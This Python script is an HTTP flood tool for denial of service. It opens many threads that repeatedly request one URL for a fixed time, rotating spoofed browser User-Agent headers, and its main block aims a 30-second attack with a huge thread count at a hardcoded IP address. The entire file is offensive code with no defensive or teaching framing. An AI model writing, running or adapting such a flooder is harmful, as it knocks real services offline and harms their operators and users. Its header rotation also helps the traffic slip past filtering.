import threading
import urllib.request
import random
import time

class AdvancedHTTPFlood:
    def __init__(self, target, duration, num_threads):
        self.target = target
        self.duration = duration
        self.num_threads = num_threads
        self.headers_list = [
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Accept-Encoding": "gzip, deflate, br"
            },
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Accept-Encoding": "gzip, deflate, br"
            },
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Accept-Encoding": "gzip, deflate, br"
            }
        ]
        self.start_time = time.time()

    def send_request(self):
        while time.time() - self.start_time < self.duration:
            try:
                headers = random.choice(self.headers_list)
                req = urllib.request.Request(self.target, headers=headers)
                with urllib.request.urlopen(req) as response:
                    print(f"Request sent with status code: {response.status}")
            except urllib.error.URLError:
                pass

    def run(self):
        threads = []
        for _ in range(self.num_threads):
            t = threading.Thread(target=self.send_request)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

if __name__ == "__main__":
    target = "http://142.171.195.145/HIT"
    duration = 30  # Duration of attack in seconds
    num_threads = 10000000000  # Number of threads to create for sending requests

    ddos = AdvancedHTTPFlood(target, duration, num_threads)
    ddos.run()
